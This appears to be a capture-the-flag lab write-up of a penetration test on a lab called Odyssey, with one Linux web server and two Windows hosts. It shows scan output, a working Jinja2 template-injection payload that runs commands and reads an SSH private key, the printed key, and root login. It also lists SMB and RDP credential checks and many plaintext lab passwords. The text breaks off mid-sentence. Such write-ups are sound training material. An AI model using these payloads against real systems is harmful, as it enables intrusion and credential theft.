# Objective and scope
You are a member of the **Hack Smarter Red Team** and have been assigned to perform a black-box penetration test against a client's critical infrastructure. There are three machines in scope: one Linux web server and two Windows enterprise hosts.

The client’s environment is currently in a degraded state due to ongoing migration efforts; the **Domain Controllers are experiencing synchronization failures**. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.
## Note from author
Odyssey was built off a recent engagement that I had where the DC's were not syncing correctly. This caused a lot of problems during the engagement. We also had to go through a proxy, which made tools like LDAP very hard to use. Your normal tools may fail... can you think outside the box?
# Hosts
Domain controller - **10.0.22.198**
Windows workstation - **10.0.28.154**
Linux webserver - **10.0.17.55**
# Enumeration
## Domain controller - **10.0.22.198**
### Open ports
```python
nmap -p- --min-rate=2000 -sT DC01.hsm.local                    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 20:05 +0000
Nmap scan report for DC01.hsm.local (10.0.22.198)
Host is up (0.090s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49698/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.88 seconds
```
### Nmap
```python
nmap -p 53,88,135,139,389,445,636,3389,9389 -A --min-rate=2000 -sT DC01.hsm.local                
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 20:14 +0000
Nmap scan report for DC01.hsm.local (10.0.22.198)
Host is up (0.091s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-11 20:14:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hsm.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  ldapssl?
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hsm.local
| Not valid before: 2025-11-17T19:53:56
|_Not valid after:  2026-05-19T19:53:56
| rdp-ntlm-info: 
|   Target_Name: HSM
|   NetBIOS_Domain_Name: HSM
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hsm.local
|   DNS_Computer_Name: DC01.hsm.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-03-11T20:14:41+00:00
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=3/11%Time=69B1CD1F%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Windows workstation - **10.0.28.154**
### Open ports
```python
nmap -p- --min-rate=2000 -sT EC2AMAZ-NS87CNK.hsm.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 20:07 +0000
Nmap scan report for EC2AMAZ-NS87CNK.hsm.local (10.0.28.154)
Host is up (0.091s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
```
### Nmap
```python
nmap -p 135,139,445,3389 -A --min-rate=2000 -sT EC2AMAZ-NS87CNK.hsm.local 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 20:17 +0000
Nmap scan report for EC2AMAZ-NS87CNK.hsm.local (10.0.28.154)
Host is up (0.15s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: HSM
|   NetBIOS_Domain_Name: HSM
|   NetBIOS_Computer_Name: EC2AMAZ-NS87CNK
|   DNS_Domain_Name: hsm.local
|   DNS_Computer_Name: EC2AMAZ-NS87CNK.hsm.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-03-11T20:18:00+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-NS87CNK.hsm.local
| Not valid before: 2025-11-29T13:15:34
|_Not valid after:  2026-05-31T13:15:34
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=3/11%Time=69B1CDEF%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Linux webserver - **10.0.17.55**
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.17.55               
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 20:09 +0000
Nmap scan report for 10.0.17.55
Host is up (0.089s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 33.50 seconds
```
### Nmap
```python
nmap -p 22,5000 -A --min-rate=2000 -sT odyssey.hsm      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 20:19 +0000
Nmap scan report for odyssey.hsm (10.0.17.55)
Host is up (0.090s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9b:67:19:80:6b:81:4a:76:2a:99:02:38:fa:8b:15:37 (ECDSA)
|_  256 0c:66:e2:8d:ad:1c:b0:0c:2a:71:c0:93:8c:89:0b:1c (ED25519)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: Odyssey Portal
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Whats interesting to note is that the webserver is a python application
# SMB (445)
## Domain controller - **10.0.22.198**
So null auth is enabled as with most DCs, but cannot use it to enumerate
Guest account appears to be disabled

## Windows workstation - **10.0.28.154**
So null is disabled here
Guest account is also disabled

# Linux webserver - 10.0.17.55
Since i cannot do anything with SMB that means i cant do anything with the workstation and the data i could gather from ldap may be unreliable as we have been told
## SSH (22)
### Auth method
```python
ssh root@odyssey.hsm                   
root@odyssey.hsm: Permission denied (publickey).
```
Key based authentication

## HTTP (5000)
### Nuclei
```python
nuclei -u http://odyssey.hsm:5000/                                   

[INF] Skipped odyssey.hsm:5000 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing http://[odyssey.hsm:5000:9780]:5000/api/v1/user_assets/touch_pass/keys"
[INF] Skipped odyssey.hsm:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=odyssey.hsm:4040 chain="connection refused; got err while executing http://odyssey.hsm:4040/jobs/"
[http-missing-security-headers:referrer-policy] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:clear-site-data] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:strict-transport-security] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:content-security-policy] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:x-frame-options] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:x-content-type-options] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:permissions-policy] [http] [info] http://odyssey.hsm:5000/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://odyssey.hsm:5000/
[options-method] [http] [info] http://odyssey.hsm:5000/ ["GET, HEAD, POST, OPTIONS"]
[caa-fingerprint] [dns] [info] odyssey.hsm
[INF] Scan completed in 1m. 13 matches found.
```
### Ffuf for vhosts
```python
nothing found
```
### Feroxbuster
```python
feroxbuster -u http://odyssey.hsm:5000/ -C 404

404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       37l       28w      540c http://odyssey.hsm:5000/templates
200      GET       31l       33w      554c http://odyssey.hsm:5000/login
200      GET       37l       33w      574c http://odyssey.hsm:5000/support
200      GET       39l       31w      742c http://odyssey.hsm:5000/reports
200      GET       45l       52w      846c http://odyssey.hsm:5000/
400      GET        5l       22w      167c http://odyssey.hsm:5000/console
```
### Website functionality
![[Pasted image 20260317144424.png|925]]
So i have found XSS in the template field
All other pages are static and not much help

## SSTI on linux webserver
I played with this for a while and also found it was vulnerable to SSTI

Using the payload `{{7*7}}` rendered the response `49`
![[Pasted image 20260317145640.png]]

And since this specific payload worked this makes me think this is probably jinja2 (python).

```python
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```
Ive found this payload online and testing it:

![[Pasted image 20260317150050.png]]
I have RCE!

Also a user called `ghill_sa`

Since i know SSH is key based auth the likely next step is to read the private key

```python
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls -la /home/ghill_sa/.ssh/')['read']()}}
```
Ill use this payload to read the contents in the .ssh dir

![[Pasted image 20260317150737.png]]
So viewing this in the source code was easier the private key is called `id_ed25519`

Now ill read the private key

```python
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /home/ghill_sa/.ssh/id_ed25519')['read']()}}
```
This is the command ive ran

```python
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACDlR4d4ZqMDWl1/LeHNaNLC33iRLx1Ne43qxPT5mp/LrAAAAKD5KGBm+Shg ZgAAAAtzc2gtZWQyNTUxOQAAACDlR4d4ZqMDWl1/LeHNaNLC33iRLx1Ne43qxPT5mp/LrA AAAEAE/VeMQoNlS7zVBMghLqtkVtg/UFp5sdO4dJ6/vK+KlOVHh3hmowNaXX8t4c1o0sLf eJEvHU17jerE9Pman8usAAAAF2doaWxsX3NhQGlwLTEwLTEtNDItMjE5AQIDBAUG -----END OPENSSH PRIVATE KEY-----
```
I should now be able to get a session as `ghill_sa` via SSH

```python
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDlR4d4ZqMDWl1/LeHNaNLC33iRLx1Ne43qxPT5mp/LrAAAAKD5KGBm+Shg
ZgAAAAtzc2gtZWQyNTUxOQAAACDlR4d4ZqMDWl1/LeHNaNLC33iRLx1Ne43qxPT5mp/LrA
AAAEAE/VeMQoNlS7zVBMghLqtkVtg/UFp5sdO4dJ6/vK+KlOVHh3hmowNaXX8t4c1o0sLf
eJEvHU17jerE9Pman8usAAAAF2doaWxsX3NhQGlwLTEwLTEtNDItMjE5AQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```
So here ive formatted it now ill change the permissions

```python
chmod 600 id_rsa
```

# Root access on the linux server
```python
ssh root@odyssey.hsm -i id_rsa
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Mar 17 15:16:17 UTC 2026

  System load:  0.0               Temperature:           -273.1 C
  Usage of /:   45.0% of 6.71GB   Processes:             118
  Memory usage: 16%               Users logged in:       0
  Swap usage:   0%                IPv4 address for ens5: 10.0.17.55

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 19 11:16:38 2025 from 10.0.0.247
root@ip-10-0-17-55:~# 
```
So after trying the user `ghill_sa` and failing i tried root and now i have root access

# Compromising `ghill_sa` on workstation
So now i have root access i looked at roots `.bash_history` and found a password `echo 'P@ssw0rd!'`

I wanted to try this for the only user i have which is `ghill_sa` 

```python
nxc smb EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth 
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd!
```
This user has now been compromised, now i can start some more enumeration

## Access on SMB as `ghill_sa` on the windows workstation
```python
nxc smb EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth --shares
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! 
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Enumerated shares
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  Share           Permissions     Remark
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  -----           -----------     ------
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  ADMIN$          READ            Remote Admin
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  C$              READ,WRITE      Default share
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  IPC$            READ            Remote IPC
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  Share           READ,WRITE
```
This user has a lot of access on SMB here

```python
nxc smb EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth --rid-brute
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! 
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  500: EC2AMAZ-NS87CNK\Administrator (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  501: EC2AMAZ-NS87CNK\Guest (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  503: EC2AMAZ-NS87CNK\DefaultAccount (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  504: EC2AMAZ-NS87CNK\WDAGUtilityAccount (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  513: EC2AMAZ-NS87CNK\None (SidTypeGroup)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1000: EC2AMAZ-NS87CNK\ghill_sa (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1001: EC2AMAZ-NS87CNK\fin_user1 (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1002: EC2AMAZ-NS87CNK\hr_admin (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1003: EC2AMAZ-NS87CNK\proj_mgr (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1004: EC2AMAZ-NS87CNK\db_readonly (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1005: EC2AMAZ-NS87CNK\audit_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1006: EC2AMAZ-NS87CNK\payroll_clerk (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1007: EC2AMAZ-NS87CNK\vpn_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1008: EC2AMAZ-NS87CNK\intranet_admin (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1009: EC2AMAZ-NS87CNK\inv_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1010: EC2AMAZ-NS87CNK\training_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1011: EC2AMAZ-NS87CNK\devops_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1012: EC2AMAZ-NS87CNK\support_staff (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1013: EC2AMAZ-NS87CNK\mktg_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1014: EC2AMAZ-NS87CNK\sales_rep (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1015: EC2AMAZ-NS87CNK\legal_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1016: EC2AMAZ-NS87CNK\ops_mgr (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1017: EC2AMAZ-NS87CNK\eng_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1018: EC2AMAZ-NS87CNK\procure_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1019: EC2AMAZ-NS87CNK\facilities_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1020: EC2AMAZ-NS87CNK\research_user (SidTypeUser)
SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  1021: EC2AMAZ-NS87CNK\bbarkinson (SidTypeUser)
```
Dumped some users, this may not be all as this is only one the workstation

Ive put all these users into a wordlist using `cut`

## RDP access on the windows workstation as `ghill_sa`
```python
nxc rdp EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth       
RDP         10.0.28.154     3389   EC2AMAZ-NS87CNK  [*] Windows 10 or Windows Server 2016 Build 26100 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (nla:True)
RDP         10.0.28.154     3389   EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! (Pwn3d!)
```
This user also has access over RDP

To read what was in the shares i think its easier to get a session via RDP

### `Share` SMB share
```python
Username: training_user
Password: Learn!2025
```
Found this in `TrainingPortal_Login.txt`

```python
Username: support_staff
Password: HelpDesk#2025
```
Found this in `SupportPortal.txt`

```python
Username: sales_rep
Password: SellMore2025
```
Found this in `Sales_Reports.txt`

```python
Username: research_user
Password: LabWork2025
```
Found this in `Research_Data.txt`

```python
Username: proj_mgr
Password: Delta@789
```
Found this in `ProjectServer_Creds.txt`

```python
Username: ops_mgr
Password: OpsSecure2025
```
Found this in `Operation_Notes.txt`

```python
Username: payroll_clerk
Password: Pay
```
Found this in `Payroll_System.txt`

```python
Username: procure_user
Password: BuyStuff2025
```
Found this in `Procurement_Portal.txt`

```python
Username: intranet_admin
Password: Intra#Access
```
Found this in `Intranet_Admin.txt`

```python
Username: hr_admin
Password: Welcome123!
```
Found this in `HR_Portal_Login.txt`

```python
Username: fin_user1
Password: Spring2025!
```
Found this in `Finance_Access.txt`

So none of these credenatials are valid so ill keep enumerating in my RDP session

# Abusing SeBackupPrivilege on windows workstation
After opening powershell as as an administrator and checking pr